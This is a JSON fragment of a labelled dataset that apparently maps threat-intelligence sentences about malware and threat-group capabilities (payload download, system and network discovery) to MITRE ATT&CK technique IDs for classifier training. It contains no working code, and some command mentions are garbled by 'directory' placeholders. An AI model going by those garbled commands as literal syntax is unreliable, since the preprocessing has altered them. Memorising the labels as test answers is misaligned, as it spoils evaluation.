  },
  {
    "type": "text",
    "text": "Sakula has the capability to download files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "SeaDuke is capable of uploading and downloading files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Seasalt has a command to download additional files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "SEASHARPEE can download remote files onto victims.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "ServHelper may download additional files to execute.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Shamoon can download an executable to run on the victim.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "SHUTTERSPEED can download and execute an arbitary executable.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "SLOWDRIFT downloads additional payloads.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Smoke Loader downloads a new version of itself once it has installed.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "It also downloads additional plugins.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Soft Cell dropped additional tools to victims during their operation, including portqry , a renamed cmd file, winrar, and HTRAN.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "SpeakUp downloads and executes additional files from a remote server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "SQLRat can make a direct SQL connection to a Microsoft database controlled by the attackers, retrieve an item from the bindata table, then write and execute the file on disk.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "StoneDrill has downloaded and dropped temporary files containing scripts; it additionally has a function to upload files from the victims machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "TA505 has downloaded additional malware to execute on victim systems.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "TDTESS has a command to download and execute an additional file.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "After re-establishing access to a victim network, Threat Group-3390 actors download tools including gsecdump and WCE that are staged temporarily on websites that were previously compromised but never used.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "TrickBot downloads several additional files and saves them to the victim's machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Trojan.Karagany can upload, download, and execute files on the victim.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Turla has used shellcode to download Meterpreter after compromising a victim.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Turla RPC backdoors can also download files onto victim machines.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "TURNEDUP is capable of downloading additional files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Unknown Logger is capable of downloading remote files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Ursnif has dropped payload and configuration files to disk.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Ursnif has also been used to download and execute additional payloads.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Vasport can download files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "VERMIN can download and upload files to the victim's machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Volgmer can download remote files and additional payloads to the victim's machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "WannaCry attempts to copy itself to remote computers after gaining access via an SMB exploit.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "WEBC2 can download and execute a file.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Wiarp creates a backdoor through which remote attackers can download files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "WIRTE has downloaded PowerShell code from the C2 server to be executed.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Xbash can download additional malicious files from its C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "XTunnel is capable of downloading additional files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Yahoyah uses HTTP GET requests to download other files that are executed in memory.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Zebrocy obtains additional code to execute on the victim's machine, including the downloading of a secondary payload.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "ZeroT can download additional payloads onto the victim.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "ZLib has the ability to download files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "ZxShell has a command to transfer files from a remote host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries can instruct Duqu to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials .",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "4H RAT sends an OS version identifier in its beacons.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "admin@338 actors used the following commands after exploiting a machine with LOWBALL malware to obtain information about the O ver >> directory",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "ADVSTORESHELL can run Systeminfo to gather information about the victim.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Agent Tesla collects the system's computer name and also has the capability to collect information on the processor, memory, and video card from the system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "APT19 collected system architecture information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "APT3 has a tool that can obtain information about the local system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "APT32 has collected the OS version and computer name from victims.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "One of the group's backdoors can also query the Windows Registry to gather system information, and another macOS backdoor performs a fingerprint of the machine on its first connection to the C&C server.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "APT37 collects the computer name, the BIOS model, and execution path.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Astaroth collects the machine name and keyboard language from the system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Azorult can collect the machine information, system architecture, the OS version, computer name, Windows product name, the number of CPU cores, video card information, and the system language.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "BabyShark has executed the ver command.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Backdoor.Oldrea collects information about the OS and computer name.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "During its initial execution, BACKSPACE extracts operating system information from the infected host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "BADCALL collects the computer name and host name on the compromised system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "BISCUIT has a command to collect the processor type, operation system, computer name, uptime, and whether the system is a laptop or PC.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "BlackEnergy has used Systeminfo to gather the OS version, as well as information on the system configuration, BIOS, the motherboard, and the processor.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Brave Prince collects hard drive content and system configuration information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "BUBBLEWRAP collects system information, including the operating system version and hostname.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Cardinal RAT can collect the hostname, Microsoft Windows version, and processor architecture from a victim machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "ChChes collects the victim hostname, window resolution, and Microsoft Windows version.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "cmd can be used to find information about the operating system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Comnie collects the hostname of the victim machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "CORESHELL collects hostname, volume serial number and OS version data from the victim and sends the information to its C2 server.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Crimson contains a command to collect the victim PC name and operating system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Derusbi gathers the name of the local host, version of GNU Compiler Collection , and the system information about the CPU, machine, and operating system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "DownPaper collects the victim host name and serial number, and then sends the information to the C2 server.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Elise executes systeminfo after initial communication is made to the remote server.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Emissary has the capability to execute ver, systeminfo, and gpresult commands.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Empire can enumerate host system information like OS, architecture, applied patches, and more.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Epic collects the OS version, hardware information, computer name, available system memory status, disk space information, and system and user language settings.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "FALLCHILL can collect operating system version information, processor information, system name, and information about installed disks from the victim.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Felismus collects the system information, including hostname and OS version, and sends it to the C2 server.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Final1stspy obtains victim Microsoft Windows version information and CPU architecture.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "FlawedAmmyy beacons out the victim operating system and computer name during the initial infection.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Fysbis has used the command ls directory | egrep -e\"fedora*|debian*|gentoo*|mandriva*|mandrake*|meego*|redhat*|lsb-*|sun-*|SUSE*|release\" to determine which Linux OS version is running.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "A Gamaredon Group file stealer can gather the victim's computer name and drive serial numbers to send to a C2 server.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Gold Dragon collects endpoint information using the systeminfo command.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "GravityRAT collects the MAC address, computer name, and CPU information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "GRIFFON has used a reconnaissance module that can be used to retrieve information about a victim's computer, including the resolution of the workstation .",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "HALFBAKED can obtain information about the OS, processor, and BIOS.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can collect system information, including computer name, system manufacturer, IsDebuggerPresent state, and execution path.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "HAWKBALL can collect the OS version, architecture information, and computer name.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Honeybee gathers computer name and information using the systeminfo command.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "HOPLIGHT has been observed collecting victim machine information like OS version, drivers, volume information and more.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Hydraq creates a backdoor through which remote attackers can retrieve information such as computer name, OS version, processor speed, memory size, and CPU speed.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "InnaputRAT gathers volume drive information and system information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "InvisiMole can gather information on the mapped drives, OS version, computer name, and memory size.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Ixeshe collects the computer name of the victim's system during the initial infection.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "JHUHUGIT obtains a build identifier as well as victim hard drive information from Windows registry key .",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Another JHUHUGIT variant gathers the victim storage volume serial number and the storage device name.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "JPIN can obtain system information such as OS version and disk space.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "jRAT collects information about the OS as well as system up-time upon receiving a connection from a backdoor.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "KARAE can collect system information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Kasidet has the ability to obtain a victim's system name and operating system version.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Kazuar gathers information on the system and local drives.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Ke3chang performs operating system information discovery using systeminfo.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "KeyBoy can gather extended system information, such as information about the operating system, disks, and memory.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "KEYMARBLE has the capability to collect the computer name, language settings, the OS version, CPU information, disk devices, and time elapsed since system start.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Kimsuky has gathered information about the infected computer.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "KOMPROGO is capable of retrieving information about the infected system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Kwampirs collects OS version information such as registered owner details, manufacturer details, processor type, available storage, installed patches, hostname, version info, system date, and other system information by using the commands systeminfo, net config workstation, hostname, ver, set, and date directory",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Several Lazarus Group malware families collect information on the type and version of the victim OS, as well as the victim computer name and CPU information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "A Destover-like variant used by Lazarus Group also collects disk space information and sends it to its C2 server.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "LightNeuron gathers the victim computer name using the Win32 API call GetComputerName.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Linfo creates a backdoor through which remote attackers can retrieve system information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Machete collects the hostname of the target computer.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Magic Hound malware has used a PowerShell command to check the victim system architecture to determine if it is an x64 machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Other malware has obtained the OS version, UUID, and computer/host name to send to the C2 server.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The initial beacon packet for Mis-Type contains the operating system version and file system of the victim.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The initial beacon packet for Misdat contains the operating system version of the victim.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "MobileOrder has a command to upload to its C2 server victim mobile device information, including IMEI, IMSI, SIM card serial number, phone number, Android version, and other information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "MoonWind can obtain the victim hostname, Windows version, RAM amount, number of drives, and screen resolution.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "More_eggs has the capability to gather the OS version and computer name.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "MURKYTOP has the capability to retrieve information about the OS.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Naid collects a unique identifier from a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "NanHaiShu can gather the victim computer name and serial number.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "NDiskMonitor obtains the victim computer name and encrypts the information to send over its C2 channel.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "NETWIRE can discover and collect victim system information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "njRAT enumerates the victim operating system and computer name during the initial infection.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "OceanSalt can collect the computer name from the system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Octopus collects system drive information, the computer name, and the size of the disk.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "OilRig has run hostname and systeminfo on a victim.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Orz can gather the victim OS version and whether it is 64 or 32 bit.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "OSInfo discovers information about the infected machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "OSX/Shlayer can collect the macOS version and IOPlatformUUID.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "OSX_OCEANLOTUS.D collects the MAC address, computer name, hardware UUID, serial number, and operating system version.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Pasam creates a backdoor through which remote attackers can retrieve information such as hostname and free disk space.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Patchwork collected the victim computer name, OS version, and architecture type and sent the information to its C2 server.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Patchwork also enumerated all available drives on the victim's machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Pisloader has a command to collect victim system information, including the system name and OS version.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "PLAINTEE collects general system enumeration data about the infected machine and checks the OS version.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "POORAIM can identify system information, including battery status.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "PoshC2 contains modules, such as Get-ComputerInfo, for enumerating common system information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "PowerDuke has commands to get information about the victim's name, build, version, serial number, and memory usage.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "POWERSTATS can retrieve OS name/architecture and computer/domain name information from compromised hosts.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "POWRUNER may collect information about the system by running hostname and systeminfo on a victim.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "A module in Prikormka collects information from the victim about Windows OS version, computer name, battery info, and physical memory.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Proxysvc collects the OS version, country name, MAC address, computer name, physical memory statistics, and volume information for all drives on the system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "PUNCHBUGGY can gather system information such as computer names.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Reaver collects system information from the victim, including CPU speed, computer name, volume serial number, ANSI code page, OEM code page identifier for the OS, Microsoft Windows version, and memory information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "RedLeaves can gather extended system information including the hostname, OS version number, platform, memory information, time elapsed since system startup, and CPU information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Remsec can obtain the OS version information, computer name, processor architecture, machine role, and OS edition.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Revenge RAT collects the CPU information, OS information, and system language.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "RogueRobin gathers BIOS versions and manufacturers, the number of CPU cores, the total physical memory, and the computer name.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "RTM can obtain the computer name, OS version, and default language identifier.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "RunningRAT gathers the OS version, logical drives information, processor information, and volume information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The initial beacon packet for S-Type contains the operating system version and file system of the victim.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "ServHelper will attempt to enumerate Windows version and system architecture.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Shamoon obtains the victim's operating system version and keyboard layout and sends the information to the C2 server.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "SHUTTERSPEED can collect system information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "SLOWDRIFT collects and sends system information to its C2.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "SOUNDBITE is capable of gathering system information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Sowbug obtained OS version and hardware configuration from a victim.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "SslMM sends information to its hard-coded C2, including OS version, service pack information, processor speed, system name, and OS install date.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Stealth Falcon malware gathers system information via WMI, including the system directory, build number, serial number, version, manufacturer, model, and total physical memory.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "StoneDrill has the capability to discover the system OS, Windows version, architecture and environment.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "StreamEx has the ability to enumerate system information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "SynAck gathers computer names, OS version info, and also checks installed keyboard layouts to estimate if it has been launched from a certain list of countries.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Sys10 collects the computer name, OS versioning information, and OS install date and sends the information to the C2.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Systeminfo can be used to gather information about the operating system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "T9000 gathers and beacons the operating system build number and CPU Architecture during installation.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Turla surveys a system upon check-in to discover operating system configuration details using the systeminfo and set commands.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "TURNEDUP is capable of gathering system information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "TYPEFRAME can gather the disk volume information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Unknown Logger can obtain information about the victim computer name, physical memory, country, and date.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Ursnif has used Systeminfo to gather system information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "VERMIN collects the OS name, machine name, and architecture information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Volgmer can gather system information, the computer name, OS version, drive and serial information from the victim's machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "WINDSHIELD can gather the victim computer name.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "WINERACK can gather information about the host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Wingbird checks the victim OS version after executing to determine where to drop files based on whether the victim is 32-bit or 64-bit.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "WinMM collects the system name, OS version including service pack, and system install date and sends the information to the C2 server.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "XAgentOSX contains the getInstalledAPP function to run ls -la directory to gather what applications are installed.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "yty gathers the computer name, the serial number of the main disk volume, CPU information, Microsoft Windows version, and runs the command systeminfo.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Zebrocy collects the OS version, computer name and serial number for the storage volume directory",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Zebrocy also runs the systeminfo command to gather system information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "ZeroT gathers the victim's computer name, Windows version, and system language, and then sends it to its C2 server.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Zeus Panda collects the OS version, system architecture, computer name, product ID, install date, and information on the keyboard mapping to determine the language used on the system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "ZLib has the ability to enumerate system information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "zwShell can obtain the victim PC name and OS version.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "ZxShell can collect the local hostname, operating system details, CPU speed, and total physical memory.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "admin@338 actors used the following command after exploiting a machine with LOWBALL malware to acquire information about local network ipconfig directory >> directory",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Agent Tesla can collect the IP address of the victim machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "APT1 used the ipconfig directory command to gather network configuration information.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "A keylogging tool used by APT3 gathers network information from the victim, including the MAC address, IP address, WINS, DHCP server, and gateway.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "APT32 used the ipconfig directory command to gather the IP address from the system.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "APT39 has used nbtscan to discover vulnerable systems.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "APT41 collected MAC addresses from victim machines.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Arp can be used to display ARP configuration information on the host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Astaroth collects the external IP address from the system.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "BabyShark has executed the ipconfig directory command.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Backdoor.Oldrea collects information about the Internet adapter configuration.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "BADCALL collects the network adapter information.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "BlackEnergy has gathered information about network IP configurations using ipconfig and about routing tables using route .",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Carbon can collect the IP address of the victims and other computers on the network using the command ipconfig -all nbtstat -n, and nbtstat -s.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Comnie uses ipconfig directory and route PRINT to identify network adapter and interface information.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Crimson contains a command to collect the victim MAC address and LAN IP.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Denis uses ipconfig to gather the IP address from the system.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Dragonfly 2.0 used batch scripts to enumerate network information, including information about trusts, zones, and the domain.",
    "command": "",
